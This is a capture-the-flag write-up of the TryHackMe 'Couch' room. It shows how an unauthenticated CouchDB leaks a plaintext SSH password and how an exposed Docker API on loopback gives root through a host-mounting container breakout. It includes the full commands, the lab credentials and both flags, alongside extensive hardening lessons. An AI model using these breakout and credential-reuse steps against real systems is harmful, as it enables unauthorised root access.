---
title: "Couch"
description: "CouchDB 1.6.1 is exposed with no admin account, so the Futon panel opens to anyone and the secret database hands over atena's password. The same password works over SSH, and an unauthenticated Docker API on loopback turns a normal user into root."
difficulty: "Easy"
tags: ["CouchDB", "NoSQL", "Database Exposure", "Credential Reuse", "Docker", "Docker API", "SSH Tunneling", "Container Escape", "Privilege Escalation", "Linux"]
date: "2026-07-21"
---

## Overview

Couch is a semi-guided room about two exposed services that should never have been exposed. The first is CouchDB on port 5984. The installation has no admin account, which in CouchDB 1.x means every request is treated as an admin request. The Futon web panel opens without a login, the database list is readable, and a database called `secret` contains a plaintext password backup for the user `atena`.

That credential is the bridge from the database to the operating system. The password is reused for SSH, so reading one JSON document becomes a shell. From there the room asks for root, and the answer is listening on loopback: `127.0.0.1:2375`, the Docker daemon's plaintext HTTP API. It has no TLS and no authentication. Anyone who can reach the port can ask the daemon — which runs as root — to start a container with the host filesystem mounted inside it. The container's root is the host's root, and `/root/root.txt` follows.

Both halves are configuration failures rather than exotic exploits. That is what makes the room useful: the same two mistakes appear constantly in real environments, and neither requires a CVE.

![Diagram of the Couch attack path: an unauthenticated CouchDB, a plaintext credential, SSH access, and an exposed Docker API](/assets/screenshots/couch/attack-chain.svg)

## Room Information

| Field | Value |
|-------|-------|
| Platform | TryHackMe |
| Room | Couch |
| Difficulty | Easy |
| Category | boot2root |
| Target | `10.49.148.244` at scan time (instance-specific) |
| Open ports | 22, 5984 |
| Operating system | Ubuntu 16.04 (Xenial) |
| Skills | CouchDB REST API, database enumeration, credential reuse, SSH local port forwarding, Docker API abuse, container breakout |
| User flag | `THM{1ns3cure_couchdb}` |
| Root flag | `THM{RCE_us1ng_Docker_API}` |

TryHackMe reassigns the target IP when an instance is restarted, and my notes show three addresses from the same room attempt: `10.49.148.244` in the nmap output, `10.49.190.110` in the ffuf output, and `10.49.164.88` in the SSH tunnel command. The commands below use `TARGET` so the walkthrough stays readable; substitute the address of your own instance.

The nmap scan was taken on 20 July 2026 and the final flag was captured on 21 July 2026. There is no `.completed` marker in the room folder, so the date above reflects the working session.

The folder contained the scan output, the ffuf results, the credential file, the listening-socket enumeration, the Docker payload, and both flags. It contained no screenshots. The terminal screenshots below come from a published walkthrough credited in the References section; the two diagrams are original to this post.

## Enumeration

### The Port Sweep

A full TCP scan is practical on a room this small, and it avoids the classic mistake of missing a service outside the top thousand ports:

```bash
nmap -sV -p- -T4 -oN nmap.txt 10.49.148.244
```

```text
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
5984/tcp open  http    CouchDB httpd 1.6.1 (Erlang OTP/18)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Only two ports are open out of 65,535. SSH is the usual entry point once credentials exist, and CouchDB is the service that might produce them. The versions also date the box: OpenSSH 7.2p2 and CouchDB 1.6.1 both fit Ubuntu 16.04, which is long past its standard support window. Old software is a hint, but the more immediate question is how CouchDB is configured.

CouchDB is a document database with an HTTP API. Everything — listing databases, reading documents, creating indexes — is a normal HTTP request with JSON in the response. That makes `curl` a first-class client and means the service can be explored without a browser.

```bash
curl -s http://TARGET:5984/ | jq -r '.version'
```

```text
1.6.1
```

The welcome document at `/` also carries an instance UUID and a vendor block, but the version is the part that matters for fingerprinting. CouchDB 1.6.1 shipped with Futon, the bundled administration UI, at `/_utils`.

### Fuzzing the Database Root

CouchDB's URL space is unusual: the first path segment is usually a database name, not a file or directory. Fuzzing the root therefore enumerates databases as much as it enumerates paths:

```bash
ffuf -u http://TARGET:5984/FUZZ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -t 40 -o dir.txt
```

The interesting results are three names:

```text
secret    [Status: 200, Size: 229]
couch     [Status: 200, Size: 228]
_log      [Status: 200, Size: 1000]
```

Most of the ffuf output is noise. The wordlist's comment lines begin with `#`, and the HTTP client treats the rest of such a line as a URL fragment, so those requests hit `/` and return the 127-byte welcome document. Blank lines do the same. Filtering on response size, or simply ignoring the `200` responses that are 127 bytes long, leaves the real databases.

`secret` is the obvious target. `couch` looks like a default or test database, and `_log` is a CouchDB endpoint that returns the server's log output — worth reading on a real engagement for paths and errors, but not needed here. The clean way to enumerate is CouchDB's own API rather than a wordlist:

```bash
curl -s http://TARGET:5984/_all_dbs | jq
```

```json
[
  "_replicator",
  "_users",
  "couch",
  "secret",
  "test_suite_db",
  "test_suite_db2"
]
```

`_replicator` and `_users` are internal CouchDB databases. `couch` looks like a default or test database, `secret` is the room's custom database, and the two `test_suite_db` entries look like leftovers from CouchDB's test suite and are not needed here; depending on the image, they may not be present.

### Futon Without a Login

CouchDB 1.x has a concept that the documentation calls "admin party": if no administrator account has been created, every request is allowed. There is no login prompt because there is no user to authenticate against. The Futon panel at `/_utils/` is fully open:

```text
http://TARGET:5984/_utils/
```

![CouchDB's Futon admin panel at /_utils, reachable without authentication](/assets/screenshots/couch/admin-panel.png)

That is the first real vulnerability, and it is a configuration choice rather than a software bug. The database is bound to `0.0.0.0:5984` — nmap saw it from the network — and no admin account exists, so anyone who can reach the port has full control of every database. Reading is enough for this room, but the same access would allow writes, deletes, and design-document changes. On CouchDB 1.6 the fix is to create an admin account and set `[couch_httpd_auth] require_valid_user = true`, then bind the service to a trusted interface.

### The Secret Database

The `secret` database contains a single document:

```bash
curl -s http://TARGET:5984/secret/_all_docs | jq
```

```json
{
  "total_rows": 1,
  "offset": 0,
  "rows": [
    {
      "id": "a1320dd69fb4570d0a3d26df4e000be7",
      "key": "a1320dd69fb4570d0a3d26df4e000be7",
      "value": {
        "rev": "2-57b28bd986d343cacd9cb3fca0b20c46"
      }
    }
  ]
}
```

The document ID is a CouchDB-generated identifier; the `_rev` value is the revision token, which matters for updates but not for a read. Fetch the document by ID:

```bash
curl -s http://TARGET:5984/secret/a1320dd69fb4570d0a3d26df4e000be7 | jq
```

```json
{
  "_id": "a1320dd69fb4570d0a3d26df4e000be7",
  "_rev": "2-57b28bd986d343cacd9cb3fca0b20c46",
  "passwordbackup": "atena:t4qfzcc4qN##"
}
```

![The single document inside the secret database](/assets/screenshots/couch/secret-database.png)

The field is named `passwordbackup`, and its value is a username and password separated by a colon. It is not hashed, encrypted, or protected by any additional layer. A backup of a password should not be a plaintext copy of the password, and it certainly should not sit in a database that anonymous users can read. The revision token is tied to the document's edit history, so it can differ between instances; the ID and the `passwordbackup` field are the stable parts.

![The document's passwordbackup field holds atena's password in plaintext](/assets/screenshots/couch/credential-document.png)

The room's question asks for the credentials found in the web administration tool. They are:

```text
atena:t4qfzcc4qN##
```

## Initial Access: Credential Reuse

There is no login form on CouchDB that accepts these credentials in a useful way; they are operating-system credentials. The only other open service is SSH, so the next step is to try them there:

```bash
ssh atena@TARGET
```

The password is `t4qfzcc4qN##`. The `##` characters are part of the password, not a comment marker, but they are special to a shell. If you pass the password through a command-line tool such as `sshpass`, quote it so the shell does not truncate it:

```bash
sshpass -p 't4qfzcc4qN##' ssh atena@TARGET
```

The login succeeds, which confirms the credential reuse:

```text
atena@ubuntu:~$
```

The banner varies between instances; what matters is the prompt and the home directory.

![SSH login as atena with the password from the database](/assets/screenshots/couch/ssh-login.png)

The user flag is waiting in the home directory:

```bash
ls
cat user.txt
```

```text
THM{1ns3cure_couchdb}
```

![The user flag in /home/atena/user.txt](/assets/screenshots/couch/user-flag.png)

The chain so far is worth restating because each link is a separate mistake. CouchDB had no authentication. The `secret` database stored a password in plaintext. The same password was valid for SSH. Any one of those would have limited the damage; together they turned an exposed database into an operating-system account.

## Privilege Escalation: The Docker API on Loopback

The usual local checks come first: `sudo -l`, SUID binaries, and listening sockets. The useful finding in this room comes from the sockets rather than the filesystem:

```bash
netstat -tuln
```

```text
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:5984            0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:37602         0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:2375          0.0.0.0:*               LISTEN
tcp6       0      0 :::22                   :::*                    LISTEN
udp        0      0 0.0.0.0:68              0.0.0.0:*                           
```

Port 2375 is the Docker daemon's plaintext HTTP API. It is bound to `127.0.0.1`, which is why nmap did not see it: the port is only reachable from the target itself, and a network scan from the attacker cannot touch it. Once you have a shell as `atena`, loopback is no longer a barrier. The second loopback listener (`37602`) is not needed for this path; 2375 is the one that matters.

![Listening sockets on the target, including 127.0.0.1:2375](/assets/screenshots/couch/listening-ports.png)

### Why the docker Group Does Not Matter Here

On a normal Docker installation, access to the daemon is controlled by the Unix socket `/var/run/docker.sock`, which is owned by `root:docker` and mode `660`. A user in the `docker` group can talk to the daemon; everyone else gets a permission error.

That control does not apply here, because the daemon is also listening on a TCP port. The Docker API itself has no authentication: if a client can open a TCP connection to port 2375, the daemon accepts its requests. Group membership is irrelevant to this listener. The `docker` group protects the socket file, not the network listener. Binding the API to `127.0.0.1` reduces the exposure to local users, but every local user is included.

This is also why port 2375 is dangerous even when it is not reachable from the internet. Any process that gets a foothold on the host can use it to become root.

### The Container Escape

One route, used by most published walkthroughs, runs the Docker client on the target itself:

```bash
docker -H 127.0.0.1:2375 run --rm -it --privileged --net=host -v /:/mnt alpine
```

Each part has a purpose:

- `-H 127.0.0.1:2375` tells the Docker client to connect to the daemon over TCP instead of the local Unix socket.
- `run` asks the daemon to create and start a container. The daemon does the work as root.
- `--rm` removes the container when the shell exits, and `-it` allocates an interactive terminal.
- `-v /:/mnt` bind-mounts the host's root filesystem at `/mnt` inside the container.
- `alpine` is a small image that provides a shell and basic tools. If the image is not cached and the target has no internet access, list the local images with `docker -H 127.0.0.1:2375 images` and use one that is already present.
- `--privileged` and `--net=host` are part of the common breakout recipe. They grant extra capabilities and share the host network, but they are not required to read the host filesystem when the host root is already bind-mounted.

Inside the container, the user is root:

```text
/ # id
uid=0(root) gid=0(root) groups=0(root)
/ # ls /mnt/root
root.txt
/ # cat /mnt/root/root.txt
THM{RCE_us1ng_Docker_API}
```

![A root shell inside the container started through the Docker API](/assets/screenshots/couch/docker-root.png)

The important detail is that root inside the container is the same UID 0 that owns files on the host. Docker's default configuration does not use user namespaces, so a process running as root in the container is not confined to an unprivileged host UID. The bind mount gives that process a path to every host file, and the kernel's permission checks see UID 0.

### The Same Attack Through an SSH Tunnel

The room folder records a second route that runs the Docker client from the attacker's machine. It starts with a local port forward:

```bash
ssh -L 2375:127.0.0.1:2375 atena@TARGET
```

`-L 2375:127.0.0.1:2375` means: listen on the attacker's local port 2375, and for every connection, open a channel through SSH to `127.0.0.1:2375` as seen from the target. The destination address is resolved by the SSH server, so `127.0.0.1` means the target's loopback interface, not the attacker's. This is the standard way to reach a service that is bound only to the target's localhost.

If local port 2375 is already in use — a Docker daemon on the attacker, for example — forward a different port such as `12375:127.0.0.1:2375` and point `-H` at `tcp://127.0.0.1:12375`. This route also requires the Docker client on the attacker; if it is not installed, use the on-target client instead.

With the tunnel open, a second terminal on the attacker can drive the remote daemon:

```bash
docker -H tcp://127.0.0.1:2375 run --rm -ti -v /:/mnt alpine chroot /mnt /bin/sh
```

The bind mount is the same; the important difference is the final command. Instead of starting an interactive Alpine shell and reading `/mnt/root/root.txt`, this runs `chroot /mnt /bin/sh`: it changes the root directory to the mounted host filesystem and executes the host's `/bin/sh`. The result is a shell whose `/` is the target's `/`:

```text
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
THM{RCE_us1ng_Docker_API}
```

The tunnel itself does not add any privilege. It only forwards a port. The privilege comes from the daemon accepting unauthenticated requests and from the container being allowed to mount the host filesystem.

![Diagram of the Docker API pivot: SSH forwarding reaches loopback, the root daemon starts a container, and the host filesystem is mounted inside it](/assets/screenshots/couch/docker-api.svg)

![The root flag read from the host's /root directory](/assets/screenshots/couch/root-flag.png)

## Flags

| Flag | Location | Value |
|------|----------|-------|
| User | `/home/atena/user.txt` | `THM{1ns3cure_couchdb}` |
| Root | `/root/root.txt` | `THM{RCE_us1ng_Docker_API}` |

## Room Questions

| Question | Answer |
|----------|--------|
| How many ports are open? | 2 |
| What database management system is installed? | CouchDB |
| What port is it running on? | 5984 |
| What version is installed? | 1.6.1 |
| Path to the web administration tool? | `_utils` |
| Path to list all databases? | `_all_dbs` |
| Credentials found in the admin tool? | `atena:t4qfzcc4qN##` |
| User flag | `THM{1ns3cure_couchdb}` |
| Root flag | `THM{RCE_us1ng_Docker_API}` |

## Commands Used

| Purpose | Command |
|---------|---------|
| Full service scan | `nmap -sV -p- -T4 -oN nmap.txt 10.49.148.244` |
| Check the CouchDB version | `curl -s http://TARGET:5984/ \| jq -r '.version'` |
| Fuzz the database root | `ffuf -u http://TARGET:5984/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40 -o dir.txt` |
| List databases | `curl -s http://TARGET:5984/_all_dbs \| jq` |
| List documents in secret | `curl -s http://TARGET:5984/secret/_all_docs \| jq` |
| Read the credential document | `curl -s http://TARGET:5984/secret/a1320dd69fb4570d0a3d26df4e000be7 \| jq` |
| Open Futon | `http://TARGET:5984/_utils/` |
| Log in over SSH | `ssh atena@TARGET` |
| Read the user flag | `cat user.txt` |
| Check sudo | `sudo -l` |
| Enumerate listening sockets | `netstat -tuln` |
| Local port forward | `ssh -L 2375:127.0.0.1:2375 atena@TARGET` |
| Run a container on the target | `docker -H 127.0.0.1:2375 run --rm -it --privileged --net=host -v /:/mnt alpine` |
| Run a container through the tunnel | `docker -H tcp://127.0.0.1:2375 run --rm -ti -v /:/mnt alpine chroot /mnt /bin/sh` |
| Read the root flag | `cat /mnt/root/root.txt` or `cat /root/root.txt` |

## Lessons Learned

- **An unauthenticated database is a full compromise.** CouchDB was not protected by a broken password or a bypassable login; there was no login at all. "Admin party" is convenient for a five-minute development instance and catastrophic on a network-reachable host.
- **Futon is an admin interface, not a status page.** `/_utils` exposes database contents and administrative operations. It should be behind authentication and, ideally, not reachable from untrusted networks at all.
- **Plaintext password backups defeat the point of a backup.** The `passwordbackup` field stored the exact credential that unlocked SSH. A backup should be protected like the original secret, and a password should never be recoverable in cleartext from a database dump.
- **Password reuse turns a data leak into a shell.** The CouchDB document and the SSH account had no business sharing a secret. Unique credentials per service, stored in a manager, would have stopped the chain at the database.
- **Loopback services are still attack surface.** Port 2375 did not appear in the network scan because it was bound to `127.0.0.1`, but it was fully usable after SSH access. `ss -tlnp` and `netstat -tuln` should be part of every post-exploitation checklist.
- **The Docker API is root by design.** The daemon creates containers, mounts filesystems, and manages the host; access to it is access to root. Port 2375 is plaintext and unauthenticated, while 2376 is the TLS port. Exposing 2375, even on localhost, is equivalent to giving every local user a root shell.
- **The `docker` group is not the only door.** Membership in the `docker` group controls the Unix socket. A TCP listener bypasses that control entirely because the API has no separate authentication layer. The fix is to keep the daemon on the Unix socket, or to require TLS client certificates on a TCP listener.
- **Containers are not a security boundary by default.** With user namespaces disabled, UID 0 in a container is UID 0 on the host. A bind mount of `/` then exposes every host file. Rootless Docker or `userns-remap` changes this calculation, which is why those features matter.
- **`--privileged` was not the essential flag.** The host root was readable because of `-v /:/mnt`, not because of `--privileged`. Understanding which flag does what prevents cargo-culting a breakout command and helps when a hardened target blocks one variant but not another.
- **Old versions widen the window.** CouchDB 1.6.1 and Ubuntu 16.04 are both past their supported life. The room is solved by configuration mistakes, but an internet-facing service on an unsupported stack is a liability even when the configuration is correct.

## References

- [TryHackMe — Couch](https://tryhackme.com/room/couch)
- [CouchDB 1.6.1 — Futon tour (archived)](https://web.archive.org/web/2020/https://docs.couchdb.org/en/1.6.1/intro/tour.html)
- [CouchDB 1.6.1 — Server API, `/_all_dbs` (archived)](https://web.archive.org/web/2020/https://docs.couchdb.org/en/1.6.1/api/server/common.html#all-dbs)
- [CouchDB 1.6.1 — Database API, `/_all_docs` (archived)](https://web.archive.org/web/2020/https://docs.couchdb.org/en/1.6.1/api/database/bulk-api.html#db-all-docs)
- [CouchDB 1.6.1 — Authentication and admin party (archived)](https://web.archive.org/web/2020/https://docs.couchdb.org/en/1.6.1/config/auth.html)
- [Docker — Protect the Docker daemon socket](https://docs.docker.com/engine/security/protect-access/)
- [HackTricks — Docker breakout](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation.html)
- [GTFOBins — docker](https://gtfobins.github.io/gtfobins/docker/)
- [Nicholas Leu — Couch writeup](https://nisforrnicholas.github.io/tryhackme/couch) (screenshots: Futon panel, secret database, credential document, SSH login, user flag, listening ports, container root, root flag)
- [kk0128 — TryHackMe Couch walkthrough](https://qiita.com/kk0128/items/7d23d303896e0bdaad44)
- [Sharon Jebitok — Couch, CouchDB?](https://sharonjebitok.com/couch-couchdb-tryhackme)
- [Doce Fernandes — How I hacked a CouchDB database](https://doce.sh/blog/tryhackme-couch)
- [Rudra — TryHackMe Couch writeup](https://rudra0x01.xyz/tryhackme-Couch)
- [Jesus Gavancho — Couch](https://jesusgavancho.gitbook.io/writeups/couch)
- [Online Blog Zone — TryHackMe Couch writeup](https://onlineblogzone.com/tryhackme-couch-writeup)
- [UnEncrypted — Couch TryHackMe](https://unencrypted.vercel.app/blog/couch-tryhackme)

*The room folder contained the nmap and ffuf output, the credential file, the saved listening-socket enumeration, the Docker payload, and both flags, but no screenshots. The terminal screenshots are from Nicholas Leu's walkthrough, credited above. The attack-chain and Docker-API diagrams are original to this post. Target IPs and shell sessions in the screenshots differ from my run.*
